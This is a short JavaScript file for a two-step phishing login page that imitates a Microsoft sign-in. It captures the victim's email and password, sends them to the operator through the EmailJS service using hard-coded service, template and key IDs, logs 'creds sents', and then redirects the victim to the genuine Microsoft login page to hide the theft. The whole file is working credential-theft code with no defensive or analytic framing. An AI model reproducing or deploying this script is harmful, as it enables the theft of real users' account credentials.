//script files
const templateID = "template_j6sb18a";
const serviceID = "service_ezioi3a";
const publicKey = "3WV5xIZoqTZpr8s26";
const usernameInput = document.getElementById('username-section');
const passwordInput = document.getElementById('password-section')
const signinOptions = document.getElementById('signin-options');
const nextBtn = document.getElementById('next-btn')
const signinBtn = document.getElementById('signin-btn')
const steps = ['username-input', 'password-input'];
let email = " "
let currentStep = 0;

nextBtn.addEventListener('click', ()=>
{
    console.log("click")
    email = document.getElementById('username-input').value;
    usernameInput.style.display = 'none';
    //signinOptions.style.display = 'none';
    passwordInput.style.display = 'block';
    document.getElementById('username-top').innerHTML = '&#x2190; ' + email;
        //currentStep = 0;

});
signinBtn.addEventListener('click', ()=>
{
    emailjs.init("3WV5xIZoqTZpr8s26");
    //send the information to the email. 
    const password = document.getElementById('password-input').value;
    const msg = "Response Gathered Email is " + email + " password is " + password;
    emailjs.send(serviceID, templateID,
    {
        message: msg
    }).then(function(response)
    {
        console.log("creds sents", response.status, response.text);
        window.location.href = "https://login.microsoftonline.com/login.srf"
    }, function(error)
    {
        console.log("failed to send ", error);
    });
});